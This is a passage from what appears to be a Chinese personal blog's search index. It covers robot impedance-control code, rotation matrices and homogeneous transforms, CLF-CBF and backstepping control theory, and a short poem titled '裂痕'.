class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">x_error = <span class="hljs-built_in">static_cast</span>&lt;vpColVector&gt;(pose_error);<br>x_dot_error = La*edVf*(x_dot_desired - fJe*q_dot);<br></code></pre></td></tr></table></figure><p>在笛卡尔空间计算位置姿态误差和速度误差。<br /><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">vpMatrix control_law = (-K*(x_error)+D*(x_dot_error)-Ja_dot*q_dot + x_dot_dot_desired);<br></code></pre></td></tr></table></figure> 通过阻抗控制计算控制律。<br />K项为刚度控制项，对位置误差施加恢复力，类似于弹簧的作用，推动机器人回到期望位置。<br />D项阻尼控制项，利用速度误差来增加阻尼，抑制振荡和不稳定行为。<br />-Ja_dot*q_dot雅可比矩阵的变化影响项，考虑了机器人关节速度和雅可比矩阵随时间变化的耦合效应。<br />x_dot_dot_desired期望加速度，直接给出系统应该达到的加速度目标。<br /><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">tau_desired = B*Ja.<span class="hljs-built_in">pseudoInverse</span>()* control_law + C + F - (I7 - Ja.<span class="hljs-built_in">t</span>()*Ja_pinv_B_t)*B*q_dot*<span class="hljs-number">100</span>;<br></code></pre></td></tr></table></figure> 计算期望力矩，其公式为：<br /><span class="math display">\[\tau = M(q)\cdot \ddot{q} + C(q,\dot{q}) +F(\dot{q}) + G(q)\]</span><br />control_law左乘 <em>Ja.pseudoInverse()</em>是将control_law从笛卡尔空间转换到任务空间。<br />后面的-(I7 -Ja.t()*Ja_pinv_B_t)*B*q_dot*100根据chatgpt的解释是误差校正项，没看懂。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">tau_cmd = tau_desired - tau0*std::<span class="hljs-built_in">exp</span>(-mu*sys_info.time_current_ - sys_info.time_start_trajectory_);<br>robot.<span class="hljs-built_in">setForceTorque</span>(vpRobot::JOINT_STATE, tau_cmd);<br></code></pre></td></tr></table></figure><p>计算真正的控制力矩tau_cmd，后面加上exp指数项是为了在启动时控制力矩是光滑的。</p>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>仿真</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Rotation Matrix</title>
    <link href="/2024/09/05/Rotation-Matrix/"/>
    <url>/2024/09/05/Rotation-Matrix/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="性质和结论">性质和结论</h2><p><strong>从B frame相对于A frame的旋转矩阵的转置即为A frame相对于Bframe的旋转矩阵，同时等于其逆矩阵：</strong> <spanclass="math display">\[^{A}_{B}R = ^{B}_{A}A^{T}=^{B}_{A}A^{-1}\]</span><strong>旋转矩阵可以将一个点(P)从一个frame(B)变换到另一个frame(A)：</strong><span class="math display">\[^{A}P=^{A}_{B}R \cdot ^{B}P\]</span><strong>用坐标轴绕参考坐标系旋转角度来确定旋转矩阵：</strong> <spanclass="math display">\[R_{Z_{A}}({\theta})=\left[\begin{matrix}cos{\theta} &amp; -sin\theta &amp; 0 \\ sin{\theta} &amp; cos{\theta}&amp; 0 \\ 0 &amp; 0 &amp; 1 \end{matrix}\right]=\left[\begin{matrix}c{\theta} &amp; -s\theta &amp; 0 \\ s{\theta} &amp; c{\theta} &amp; 0 \\0 &amp; 0 &amp; 1 \end{matrix}\right]\]</span> <spanclass="math display">\[R_{X_{A}}({\theta})=\left[\begin{matrix} 1 &amp;0 &amp; 0 \\ 0 &amp; cos{\theta} &amp; -sin{\theta} \\ 0 &amp;sin{\theta} &amp; cos{\theta} \end{matrix}\right]=\left[\begin{matrix} 1&amp; 0 &amp; 0 \\ 0 &amp; c{\theta} &amp; -s{\theta} \\ 0 &amp;s{\theta} &amp; c{\theta} \end{matrix}\right]\]</span> <spanclass="math display">\[R_{Y_{A}}({\theta})=\left[\begin{matrix}cos{\theta} &amp; 0 &amp; sin{\theta} \\ 0 &amp; 1 &amp; 0 \\-sin{\theta} &amp; 0 &amp; cos{\theta}\end{matrix}\right]=\left[\begin{matrix} c{\theta} &amp; 0 &amp;s{\theta} \\ 0 &amp; 1 &amp; 0 \\ -s{\theta} &amp; 0 &amp; c{\theta}\end{matrix}\right]\]</span> <em>A表示Aframe，参考坐标系，即世界坐标系，B表示Bodyframe，本地坐标系，即物体坐标系。</em></p><p><strong>描述一个frame(B)相对另一个frame(A)的姿态：</strong> <spanclass="math display">\[^{A}_{B}R=\left[\begin{matrix} | &amp; | &amp; |\\ ^{A}X_{B} &amp; ^{A}Y_{B} &amp; ^{A}Z_{B} \\ | &amp; | &amp; |\end{matrix}\right]\]</span> <em>其中<spanclass="math inline">\(^{A}X_{B}\)</span>，<spanclass="math inline">\(^{A}Y_{B}\)</span>，<spanclass="math inline">\(^{A}Z_{B}\)</span>分别代表B frame各坐标轴在Aframe投影的列向量。</em></p><h2 id="fixed-angles">Fixed Angles</h2><p><strong>针对空间中固定的坐标系XYZ进行旋转操作：</strong> <spanclass="math display">\[^{A}_{B}R_{XYZ}(\gamma,\beta,\alpha)=R_{Z}(\alpha)R_{Y}(\beta)R_{X}(\gamma)\]</span><span class="math display">\[=\left[\begin{matrix} c{\alpha} &amp;-s\alpha &amp; 0 \\ s{\alpha} &amp; c{\alpha} &amp; 0 \\ 0 &amp; 0 &amp;1 \end{matrix}\right]\left[\begin{matrix} c{\beta} &amp; 0 &amp;s{\beta} \\ 0 &amp; 1 &amp; 0 \\ -s{\beta} &amp; 0 &amp; c{\beta}\end{matrix}\right]\left[\begin{matrix} 1 &amp; 0 &amp; 0 \\ 0 &amp;c{\gamma} &amp; -s{\gamma} \\ 0 &amp; s{\gamma} &amp; c{\gamma}\end{matrix}\right]\]</span> <spanclass="math display">\[=\left[\begin{matrix}c{\alpha}c{\beta} &amp;c{\alpha}s{\beta}s{\gamma}-s{\alpha}c{\gamma} &amp;c{\alpha}s{\beta}c{\gamma}+s{\alpha}s{\gamma} \\ s{\alpha}c{\beta} &amp;s{\alpha}s{\beta}s{\gamma}+c{\alpha}c{\gamma} &amp;s{\alpha}s{\beta}c{\gamma}-c{\alpha}s{\gamma}  \\-s{\beta} &amp;c{\beta}s{\gamma} &amp;c{\beta}c{\gamma}\end{matrix}\right]=\left[\begin{matrix}r_{11} &amp;r_{12} &amp; r_{13} \\ r_{21} &amp; r_{22} &amp; r_{23} \\ r_{31} &amp;r_{32} &amp; r_{33}\end{matrix}\right]\]</span></p><p><em>先转的放在后面，转动的顺序（左乘）是不能互换的。</em></p><p><strong>通过R推算Angles：</strong> <spanclass="math display">\[^{A}_{B}R_{XYZ}(\gamma,\beta,\alpha)=\left[\begin{matrix}c{\alpha}c{\beta}&amp; c{\alpha}s{\beta}s{\gamma}-s{\alpha}c{\gamma} &amp;c{\alpha}s{\beta}c{\gamma}+s{\alpha}s{\gamma} \\ s{\alpha}c{\beta} &amp;s{\alpha}s{\beta}s{\gamma}+c{\alpha}c{\gamma} &amp;s{\alpha}s{\beta}c{\gamma}-c{\alpha}s{\gamma}  \\-s{\beta} &amp;c{\beta}s{\gamma} &amp;c{\beta}c{\gamma}\end{matrix}\right]=\left[\begin{matrix}r_{11} &amp;r_{12} &amp; r_{13} \\ r_{21} &amp; r_{22} &amp; r_{23} \\ r_{31} &amp;r_{32} &amp; r_{33}\end{matrix}\right]\]</span> <spanclass="math inline">\(if\space{\beta} \neq 90^{\circ}\)</span> <spanclass="math display">\[\beta=Atan2(-r_{31},\sqrt{r_{11}^2+r_{21}^2})\]</span><spanclass="math display">\[\alpha=Atan2(\frac{r_{21}}{c{\beta}},\frac{r_{11}}{c{\beta}})\]</span><spanclass="math display">\[\gamma=Atan2(\frac{r_{32}}{c{\beta}},\frac{r_{33}}{c{\beta}})\]</span><span class="math inline">\(if \space \beta=90^{\circ}\)</span> <spanclass="math display">\[\alpha=0^{\circ}\]</span> <spanclass="math display">\[\gamma=Atan2(r_{12},r_{22})\]</span> <spanclass="math inline">\(if \space \beta=-90^{\circ}\)</span> <spanclass="math display">\[\alpha=0^{\circ}\]</span> <spanclass="math display">\[\gamma=-Atan2(r_{12},r_{22})\]</span></p><h2 id="euler-angles">Euler Angles</h2><p><strong>Z-Y-X</strong> <spanclass="math display">\[^{A}_{B}R_{Z^{&#39;}Y^{&#39;}X^{&#39;}}(\alpha,\beta,\gamma)=^{A}_{B^{&#39;}}R^{B^{&#39;}}_{B^{&#39;&#39;}}R^{B^{&#39;&#39;}}_{B}R=R_{Z^{&#39;}}(\alpha)R_{Y^{&#39;}}(\beta)R_{X^{&#39;}}(\gamma)\]</span><em>先转的放在前面，转动的顺序（左乘）是不能互换的。</em> <em>对FixedAngle以XYZ的顺序转动，相当于对Euler Angle以ZYX的顺序转动。</em><em>Euler Angle的正转和Fixed Angle的反转会得到相同的解。</em></p><h2 id="刚体状态的表达">刚体状态的表达</h2><p><strong>Homogeneous transformation matrix (4x4):</strong> <spanclass="math display">\[^{A}_{B}T=\left[\begin{matrix}^{A}_{B}R_{3\times3}&amp; ^{A}P_{B_{org}3\times1} \\ 0_{1\times3} &amp;1\end{matrix}\right]\]</span> <spanclass="math display">\[=\left[\begin{matrix} | &amp; | &amp; | &amp; |\\ ^{A}X_{B} &amp; ^{A}Y_{B} &amp; ^{A}Z_{B} &amp; P_{B_{org}} \\ |&amp; | &amp; | &amp; | \\ 0 &amp; 0 &amp; 0 &amp; 1\end{matrix}\right]\]</span><em>左上角为旋转矩阵，右上角为移动状态。</em></p><p><strong>移动和转动复合运算：</strong> <spanclass="math display">\[^{A}P_{3\times1}=^{A}_{B}R^{B}P_{3\times1}+^{A}P_{B_{org}3\times1}\]</span><span class="math display">\[\left[\begin{matrix}^{A}P \\1\end{matrix}\right]=^{A}_{B}T\left[\begin{matrix}^{B}P \\1\end{matrix}\right]\]</span></p><p><strong>可连续操作：</strong> <spanclass="math display">\[^{A}_{B}T=^{A}_{C}T^{C}_{D}T^{D}_{B}T\]</span><em>"sequential transformation"</em></p><p><strong>Mapping and Operator:</strong></p><p>transformationmatrix既有Mapping（把向量从一个frame转换到另一个frame下来看）的功能也可当作Operator对向量（或点）进行移动或旋转（在同一个frame）。</p><p><span class="math display">\[\left[\begin{matrix}^{A}P_2 \\1\end{matrix}\right]=T\left[\begin{matrix}^{A}P_1 \\1\end{matrix}\right]\]</span></p><h2 id="homogeneous-transformation-matrix的三种用法">Homogeneoustransformation matrix的三种用法</h2><ol type="1"><li>描述一个frame（相对于另一个frame）的空间状态。 <spanclass="math display">\[^{A}_{B}T=\left[\begin{matrix} | &amp; | &amp; |&amp; | \\ ^{A}X_{B} &amp; ^{A}Y_{B} &amp; ^{A}Z_{B} &amp; P_{B_{org}}\\ | &amp; | &amp; | &amp; | \\ 0 &amp; 0 &amp; 0 &amp; 1\end{matrix}\right]\]</span></li><li>将point由某一个frame的表达转换到另一个frame来表达。 <spanclass="math display">\[\left[\begin{matrix}^{A}P \\1\end{matrix}\right]=^{A}_{B}T\left[\begin{matrix}^{B}P \\1\end{matrix}\right]\]</span></li><li>将point(vector)在同一个frame中进行移动和转动。 <spanclass="math display">\[\left[\begin{matrix}^{A}P_2 \\1\end{matrix}\right]=T\left[\begin{matrix}^{A}P_1 \\1\end{matrix}\right]\]</span></li></ol><h2 id="transformation-matrix运算">Transformation Matrix运算</h2><p><strong>逆矩阵：</strong></p><p><spanclass="math display">\[^{A}_{B}T^{B}_{A}T=^{A}_{B}T^{A}_{B}T^{-1}=I_{4\times4}\]</span></p><p><spanclass="math display">\[^{A}_{B}T^{-1}=\left[\begin{matrix}^{A}_{B}R^{T}&amp; -^{A}_{B}{R^{T}}^{A}P_{B_{org}} \\ 0_{1\times3} &amp;1\end{matrix}\right]\]</span> <strong>连续运算法则：</strong></p><ol type="1"><li>{B}对{A}的转轴旋转：用"premultiply"，先转的放在后面</li><li>{B}对{B}自身的转轴旋转：用"postmultiply"，先转的放在前面</li></ol><h2 id="links">links</h2><p><a href="https://www.coursera.org/learn/robotics1">機器人學一(Robotics (1))</a></p>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CLF-CBF</title>
    <link href="/2024/09/04/CLF-CBF/"/>
    <url>/2024/09/04/CLF-CBF/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2id="动态控制仿射系统dynamics-control-affine-system">1.动态控制仿射系统(DynamicsControl Affine System)</h2><p>对于<span class="math inline">\(\dot{x} =F(t,x,u)\)</span>，其中系统状态<spanclass="math inline">\(x\in{\mathbb{R}^n}\)</span>，系统输入<spanclass="math inline">\(u \in{\mathbb{R}^m}\)</span>，如果<spanclass="math inline">\(F\)</span>对于<spanclass="math inline">\(x\)</span>和<spanclass="math inline">\(u\)</span>是Lipschitz连续的，时间<spanclass="math inline">\(t\)</span>是piecewise连续的，那么在给定的初始条件<spanclass="math inline">\(x_0\)</span>下，轨迹<spanclass="math inline">\(x(t)\)</span>是存在并且unique的。</p><p>一般写成如下形式：</p><p><span class="math display">\[\dot{x} = f(x) + g(x)u\]</span></p><p>其中<spanclass="math inline">\(f:\mathbb{R}^n\rightarrow{\mathbb{R}^n},g:\mathbb{R}^n\rightarrow{\mathbb{R}^{n*m}}\)</span>，<spanclass="math inline">\(x\)</span>是Lipschitz连续，<spanclass="math inline">\(x_e = 0\)</span>。</p><h2 id="clfcontrol-lyapunov-function">2.CLF(Control LyapunovFunction)</h2><p>Lyapunove Function数学定义如下：</p><p><span class="math display">\[V(x)\]</span> <spanclass="math display">\[s.t. V(x_e) = 0, V(x) &gt; 0 \ for \ x \neqx_e\]</span> <span class="math display">\[\dot{V(x)} = \frac{\partialV}{\partial x}f(x) &lt; 0 \ for \ x \neq x_e\]</span></p><p><spanclass="math inline">\(V(x)\)</span>是定义的Lyapunov函数，下面的是约束条件，当满足上述两个约束时，我们可以认为x渐近稳定。</p><p>将输入<span class="math inline">\(u\)</span>引入到LyapunoveFunction，得到新的方程。 使<spanclass="math inline">\(V(x):\mathbb{R}^n\rightarrow{\mathbb{R}}\)</span>是连续Differential函数，如果存在一个常数<spanclass="math inline">\(c&gt;0\)</span>使得<spanclass="math inline">\(V(x)\)</span>满足如下条件，那么<spanclass="math inline">\(V(x)\)</span>就是一个关于<spanclass="math inline">\(x\)</span>的Control Lyapunov Function。</p><p><span class="math inline">\(1)\ \Omega := \{x\in{\mathbb{R}^n}:V(x)\le{c}\}\)</span>，<spanclass="math inline">\(V(x)\)</span>是有界的</p><p><span class="math inline">\(2)\ V(x)&gt;0\)</span>，对于所有的<spanclass="math inline">\(s\in{R^n}\backslash \{x_e\}\)</span>，<spanclass="math inline">\(V(e_e)=0\)</span></p><p><span class="math inline">\(3)\inf_{u\in{U}}\dot{V}(x,u)&lt;0\)</span>，对于所有的<spanclass="math inline">\(x\in{\Omega_c}\backslash\{x_e\}\)</span></p><p>为了简化<spanclass="math inline">\(\dot{V}(x,u)\)</span>的表达，用Lie括号描述：</p><p><span class="math display">\[\dot{V}(x,u) = \nabla{V}(x) * \dot{x} =\nabla{V}(x) * f(x) + \nabla{V}(x) * g(x)*u = L_fV(x) +L_gV(x)u\]</span> <spanclass="math display">\[(L_pq(x):=\nabla{q(x)}*p(x))\]</span></p><p>CLF保证系统最终会稳定，但不能确定多快才能稳定，这时候引入指数稳定CLF(ESCLF)。</p><p>如果存在常数<span class="math inline">\(\lambda &gt;0\)</span>使得<span class="math inline">\(inf_{u\in{U}}\dot{V}(x,u)+{\lambda}{V(x)}\le0\)</span> ，那么<spanclass="math inline">\(V(x)\)</span>就是ESCLF。</p><p><img src="/img/CLF-CBF/ESCLF.png" /></p><h2 id="clf-qp">3.CLF-QP</h2><p>将CLF转化为QP问题，搜索满足CLF-QP问题的输入u。</p><p><span class="math display">\[argmin\  (u-u_ref)^{T}{H(u-u_ref)}+p\delta^2\]</span> <spanclass="math display">\[subject\ to :\L_fV(x)+L_gV(x)u+\lambda{V(x)}\le{\delta}\]</span></p><p>其中<span class="math inline">\(\delta\)</span>是松弛变量，<spanclass="math inline">\(p\)</span>是惩罚因子，设置松弛变量的目的是在实际搜索中，较难找到一个合适的解，增加松弛变量后会放松CLF条件，在允许的情况下不满足CLF约束，但获得一个解。</p><p>另外，这里的H是Hassian矩阵，表示二次项系数，将<spanclass="math inline">\((u-u_ref)^{T}{H(u-u_ref)}\)</span>理解为二次的cost函数(或者能量函数？)，是人为构建的，二次保证解的u的输入使系统收敛较快。</p><h2 id="cbf">4.CBF</h2><p>CLF约束确保系统渐趋稳定，而CBF的作用是确保系统安全，使系统处于规定的安全集合约束内。</p><pre><code class="hljs">//TODO:补充CBF原理</code></pre><p>当<span class="math inline">\(B(x):\mathbb{R}^n \rightarrow\mathbb{R}\)</span>是连续可微的，零超水平集(zero-superlevel)为<spanclass="math inline">\(C\)</span>，<spanclass="math inline">\(C=\{x|B(x)\ge0\}\)</span>，对于所有<spanclass="math inline">\(x\in{\partial{C}}\)</span>，<spanclass="math inline">\(\nabla{B(x)\ne0}\)</span>，如果存在一个扩展<spanclass="math inline">\(Class \ K_\infty\)</span>函数<spanclass="math inline">\(\alpha\)</span>（工程中一般使用正常数和<spanclass="math inline">\(B(x)\)</span>的线性组合获取，如：<spanclass="math inline">\(\gamma{B(x)},\gamma&gt;0\)</span>），存在一个集合<spanclass="math inline">\(D\subset{\mathbb{R}^n}\)</span>，使得<spanclass="math inline">\(C\subset{D}\)</span>满足：</p><p><spanclass="math display">\[sup_{u\in{U}}[L_f{B(x)}+L_g{B(x)}u]+\alpha({B(x)})\ge0\]</span></p><p>那么对于所有<span class="math inline">\(x\in{D}\)</span>，<spanclass="math inline">\(B(x)\)</span>是一个CBF。</p><p><img src="/img/CLF-CBF/CBF.png" /></p><h2 id="clf-cbf-qp">5.CLF-CBF-QP</h2><p>将CLF和CBF都转化为QP问题的约束条件，其中CLF保证控制器稳定，CBF保证控制满足安全条件。</p><p><span class="math display">\[argmin\  (u-u_ref)^{T}{H(u-u_ref)}+p\delta^2\]</span> <spanclass="math display">\[subject\ to :\]</span> <spanclass="math display">\[\L_fV(x)+L_gV(x)u+\lambda{V(x)}\le{\delta}\]</span> <spanclass="math display">\[L_f{B(x)}+L_g{B(x)}u]+\gamma{B(x)}\ge0\]</span></p><h2 id="links">links</h2><ul><li><em><ahref="https://zhuanlan.zhihu.com/p/568328445">根据自适应巡航系统(ACC)来理解CBF(ControlBarrier Function)-入门知识</a></em><br /></li><li><em><a href="https://zhuanlan.zhihu.com/p/277326421">CLF-CBFController</a></em><br /></li><li><em><ahref="https://github.com/HybridRobotics/CBF-CLF-Helper">HybridRobotics/CBF-CLF-Helper</a></em><br /></li><li><em><a href="https://www.youtube.com/watch?v=_Tkn_Hzo4AA">Jason Choi-- Introduction to Control Lyapunov Functions and Control BarrierFunctions</a></em></li></ul>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反步控制</title>
    <link href="/2024/09/04/%E5%8F%8D%E6%AD%A5%E6%8E%A7%E5%88%B6/"/>
    <url>/2024/09/04/%E5%8F%8D%E6%AD%A5%E6%8E%A7%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="物理模型">1.1 物理模型</h2><p>令期望轨迹为<span class="math inline">\(sint\)</span>曲线：<br /><span class="math display">\[x_d = \sin{t}\]</span> <spanclass="math display">\[\dot{x_d} = \cos{t}\]</span></p><p>写出状态方程：<br /><span class="math display">\[\dot{x_1} = x_2 + f_1(x_1)\]</span> <spanclass="math display">\[\dot{x_2} = u + f_2(x_1,x_2) = u + \frac{(M * g *l)}{J} * \sin{x_1} - \frac{D}{J} * x_2\]</span></p><p><span class="math display">\[f_1(x_1) = 0\]</span> <spanclass="math display">\[f_2(x_1,x_2) = \frac{(M * g * l)}{J} * \sin{x_1}- \frac{D}{J} * x_2\]</span>其中第一项为重力对系统的影响，第二项为摩擦力对系统的影响。</p><p><em>其中M为质量，g为重力加速度，l为臂长，J为转动惯量，D为阻尼系数。</em><em><span class="math inline">\(\dot{x_1}\)</span>为角速度，<spanclass="math inline">\(\dot{x_2}\)</span>为角加速度，<spanclass="math inline">\(x_1\)</span>为角度，<spanclass="math inline">\(x_2\)</span>为角速度。</em></p><h2 id="知识补充">1.2 知识补充</h2><p>力矩<span class="math inline">\(M = |F| * |r| *\sin{\varphi}\)</span>力矩除以转动惯量可以描述一个物体收到的外部力矩对其角加速度的影响。阻尼系数除以转动惯量乘以角速度描述了在转动运动中由阻尼产生的转动摩擦力的效应。这个物理量通常被称为阻尼比。</p><p><em>*部分解释来自chatgpt</em></p><h2 id="反步控制">2.1 反步控制</h2><p>构造误差 <span class="math display">\[e_1 = x_1 - x_d\]</span> <spanclass="math display">\[e_2 = x_2 - \alpha_1\]</span> 其中<spanclass="math inline">\(\alpha_1\)</span>为虚拟控制律，即中间状态的控制量。</p><p>构造Lyapunov函数 <span class="math display">\[V_1 =\frac{1}{2}{e_1}^2\]</span> <span class="math display">\[V_2 =\frac{1}{2}{e_1}^2 + \frac{1}{2}{e_2}^2\]</span></p><p>由Lyapunov方法可知，需令<spanclass="math inline">\(\dot{V_1}\)</span> ,<spanclass="math inline">\(\dot{V_2}\)</span>负定使得系统渐趋稳定。</p><p><span class="math display">\[\dot{V_1} = {e_1}\dot{e_1} ={e_1}(\dot{x_1} - \dot{x_d}) = {e_1}(x_2 + f_1(x_1) -\cos{t})\]</span></p><p>故令<span class="math inline">\(\alpha_1 = \cos{t} - e_1 -f_1(x_1)\)</span>，注意此时<spanclass="math inline">\(\alpha_1\)</span>为虚拟控制律，<spanclass="math inline">\(x_2\)</span>为实际控制</p><p><span class="math display">\[\dot{V_1} = {e_1}\dot{e_1} ={e_1}(\dot{x_1} - \dot{x_d})\]</span> <span class="math display">\[ ={e_1}(x_2 + f_1(x_1) - \cos{t}) = {e_1}(e_2 + \alpha_1 + f_1(x_1) -\cos{t}) = {e_1}(e_2 - e_1)\]</span></p><p><span class="math display">\[\dot{e_2} = \dot{x_2} - \dot{\alpha_1} =u + f_2(x_1,x_2) - \dot{\alpha_1}\]</span></p><p><span class="math display">\[\dot{V_2} = e_1(e_2 - e_1) +{e_2}\dot{e_2} = -{e_1}^2 + {e_2}({e_1} + \dot{e_2})\]</span></p><p>需令<span class="math inline">\(\dot{V_2}\)</span>负定，令<spanclass="math inline">\(e_1 + \dot{e_2} = -e_2\)</span>即可，此时<spanclass="math inline">\(\dot{V_2} = -{e_1}^2 - {e_2}^2\)</span>负定 代入得<span class="math inline">\(e_1 + u + f_2(x_1,x_2) - \alpha_1 =-e_2\)</span> 得到最终控制量<span class="math inline">\(u = -e_1 - e_2 -f_2(x_1,x_2) + \dot{\alpha_1}\)</span></p><p>上面得到 <span class="math display">\[f_1(x_1) = 0\]</span> <spanclass="math display">\[f_2(x_1,x_2) = \frac{(M * g * l)}{J} * \sin{x_1}- \frac{D}{J} * x_2\]</span></p><p>所以<span class="math display">\[u = -e_1 - e_2 + \dot{\alpha_1} -(\frac{(M * g * l)}{J} * \sin{x_1} - \frac{D}{J} * x_2)\]</span></p><h2 id="links">links</h2><ul><li><em><ahref="https://haosutopia.github.io/2018/01/Backstepping-01/">Backstepping（反步控制）</a></em></li><li><em><ahref="https://zh.wikipedia.org/wiki/%E5%8F%8D%E6%8E%A8%E6%8E%A7%E5%88%B6">wiki反推控制</a></em></li></ul>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>裂痕</title>
    <link href="/2024/09/03/%E8%A3%82%E7%97%95/"/>
    <url>/2024/09/03/%E8%A3%82%E7%97%95/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><center>裂痕</center><center>边缘纹路生长，</center><center>哭泣的笑容，</center><center>过去的完整再无有几分存在。</center><center>爱或未来，</center><center>自甘地遗忘。</center><center>燃烧一盎司灵魂也无法弥补这急转隔断，</center><center>都不足一千公里的时间长。</center><center>笨拙的花张口结舌，</center><center>眼泪流淌。</center><center>几缕薄影倏忽而过，</center><center>哀荣四泻。</center><center>破碎，</center><center>月和目光。</center><center>源头是廉价的情感理想，</center><center>尾流入地海。</center><center>二到一到二，</center><center>无到有到无。</center><center>过度或翼翼滋生裂隙，</center><center>自产怒火惊雷，</center><center>静静撕咬。</center><center>曾是永远完整永远一起，</center><center>无有输赢，</center><center>而今却是谢幕时光。</center><center>痛苦急速转换，</center><center>一道无形的裂痕悄然而生，</center><center>自此疾驰。</center><center>幻想和秋风，</center><center>由我亲手斩断，</center><center>显现的裂痕，</center><center>存于你我各自世界之间</center>]]></content>
    
    
    <categories>
      
      <category>发电</category>
      
    </categories>
    
    
    <tags>
      
      <tag>poem</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
